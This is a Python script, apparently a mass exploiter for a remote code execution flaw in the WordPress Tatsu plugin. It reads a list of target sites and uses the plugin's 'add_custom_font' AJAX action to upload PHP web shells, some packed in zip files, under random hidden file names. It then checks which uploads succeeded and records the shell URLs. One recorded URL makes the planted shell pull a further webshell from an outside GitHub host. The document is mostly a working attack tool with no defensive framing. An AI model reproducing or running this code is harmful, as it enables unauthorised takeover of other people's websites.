# -*- coding: utf-8 -*-
from itertools import cycle
import warnings,random,socket,time
import requests, re, sys, os,threading
import base64
import zipfile
import string
reload(sys)
sys.setdefaultencoding('utf8')
from multiprocessing.dummy import Pool
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore',InsecureRequestWarning)


cyz_shell = open('Files/.cyz.css','r').read()

def prepare(sites):


    listx = ["/","/wp/","/wordpress/","/blog/","/old/","/new/","/site/"]
    if 'http' not in sites:
        sites = 'http://'+sites
    Headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) "
                            "AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
    #print "sss"
    try:
        #sites = str(sites)
        style = 'abcdefghijklmnopqrstuvwxyz'
        malLen = 5
        randomName = ''.join(random.sample(style, malLen))
        nameshell = str(randomName)
        file = {'file':('.cyz_'+nameshell+'.php',cyz_shell)}
        try:
            sdk = requests.get(sites+"/wp-admin/admin-ajax.php",verify=False,timeout=15,headers=headers)
            if sdk.status_code == 302:
                sites =sites.replace("http://","https://")
            else:
                sites = sites
        except:
            sites = sites
        try:
            ngewersz = requests.post(sites+"/wp-admin/admin-ajax.php", data = {"action": "add_custom_font"}, files = file, headers = Headers, verify=False,timeout=8)
        except:
            pass
        Headers = {
                "X-Requested-With": "XMLHttpRequest",
                "Origin": sites,
                "Referer": sites,
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.9"
            }
        ngewe=requests.get(sites+"/wp-content/uploads/2022/05/"+'.cyz_'+nameshell+'.php',headers=Headers,verify=False,timeout=15)
        if "Cyz4rineFams" in str(ngewe.text.encode("utf-8")):
            print '[-] '+sites + ' ====> Uploaded'
            open('Result/Shells.txt', 'a').write(sites+"/wp-content/uploads/2022/05/.cyz_"+nameshell+'.php?a=https://raw.githubusercontent.com/botersx/WEBSHELL/master/mar.php\n')
        else:

            #shellFilename = None
            anjgs = (''.join(random.choice(string.ascii_lowercase) for i in range(5)))

            files = {"file": (anjgs+".zip" , open('Files/cyztatsuphp.zip', 'rb'))}
            try:
                ngewer = requests.post(sites+"/wp-admin/admin-ajax.php", data = {"action": "add_custom_font"}, files = files, headers = Headers, verify=False,timeout=18)
                #print(str(ngewer.text.encode("utf-8").text.encode("utf-8")))
            except:
                pass
            ngewe2=requests.get(sites+"/wp-content/uploads/typehub/custom/"+anjgs+"/.cyz.php",headers=Headers,verify=False,timeout=15)
            if "Cyz4rineFams" in str(ngewe2.text.encode("utf-8")) and "<?php" not in str(ngewe2.text.encode("utf-8")):
                print '[-] '+sites + ' ====> Uploaded'
                open('Result/Shells.txt', 'a').write(sites+"/wp-content/uploads/typehub/custom/"+anjgs+"/.cyz.php"+'\n')
                
            else:
                print '[-] '+sites + ' ====> Not Vuln'
                    
#.cyz.css?cyz=UP
    except Exception as e:
        print str(e)

#/?xxxxxxxxxxxx_filename=.htaccess&xxxxxxxxxxxx_del=1



Targetssa = sys.argv[1] #for date

result = """
                                                                           
 @@@@@@@  @@@ @@@  @@@@@@@@       @@@   @@@@@@@   @@@  @@@  @@@  @@@@@@@@  
@@@@@@@@  @@@ @@@  @@@@@@@@      @@@@   @@@@@@@@  @@@  @@@@ @@@  @@@@@@@@  
!@@       @@! !@@       @@!     @@!@!   @@!  @@@  @@!  @@!@!@@@  @@!       
!@!       !@! @!!      !@!     !@!!@!   !@!  @!@  !@!  !@!!@!@!  !@!       
!@!        !@!@!      @!!     @!! @!!   @!@!!@!   !!@  @!@ !!@!  @!!!:!    
!!!         @!!!     !!!     !!!  !@!   !!@!@!    !!!  !@!  !!!  !!!!!:    
:!!         !!:     !!:      :!!:!:!!:  !!: :!!   !!:  !!:  !!!  !!:       
:!:         :!:    :!:       !:::!!:::  :!:  !:!  :!:  :!:  !:!  :!:       
 ::: :::     ::     :: ::::       :::   ::   :::   ::   ::   ::   :: :::: Tatsu RCE - Exploiter 
 :: :: :     :     : :: : :       :::    :   : :  :    ::    :   : :: ::  Cyz4rine Corps. 
                                                                           
"""
print(result)
try:
    try:
        nam = Targetssa
        th = sys.argv[2]
        time.sleep(3)
        sites = [ i.strip() for i in open(nam, 'r').readlines() ]
        zm = Pool(int(th))
        zm.map(prepare, sites)
    except Exception as e:
        print str(e)
    else:
        print "NGENTOD"
except:
    print "NGENTOD"